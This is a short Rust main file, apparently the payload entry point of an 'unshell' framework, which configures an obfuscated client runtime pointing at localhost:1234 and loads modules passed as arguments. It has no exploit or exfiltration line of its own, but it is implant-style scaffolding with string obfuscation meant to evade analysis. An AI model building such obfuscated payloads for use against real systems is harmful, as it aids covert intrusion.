use std::collections::HashMap;

use lazy_static::lazy_static;
use unshell_lib::{
    ModuleError,
    config::{PayloadConfig, RuntimeConfig},
    module::{Manager, Module},
};
use unshell_obfuscate::{obs, symbol};

#[macro_use]
extern crate unshell_lib;

lazy_static! {
    static ref PAYLOAD_CONFIG: PayloadConfig = PayloadConfig {
        id: symbol!("Test ID"),
        components: unshell_lib::get_components(),
        runtime_config: vec![RuntimeConfig {
            parent_component: symbol!("client"),
            name: symbol!("client runtime"),
            config: HashMap::from([(symbol!("host"), obs!("localhost:1234"))]),
        }],
    };
}

fn main() {
    // #[cfg(not(feature = "obfuscate"))]
    unshell_lib::logger::PrettyLogger::init();

    debug!("Initialized");

    match || -> Result<(), ModuleError> {
        let args = std::env::args();

        let mut modules = Vec::new();
        for arg in args.skip(1) {
            debug!("Loading module: {}", arg);
            modules.push(Module::new(&arg)?)
        }

        Manager::run(&PAYLOAD_CONFIG, modules);

        Ok(())
    }() {
        Ok(_) => {}
        Err(e) => {
            debug!("ERROR! {:?}", e);
        }
    }
}
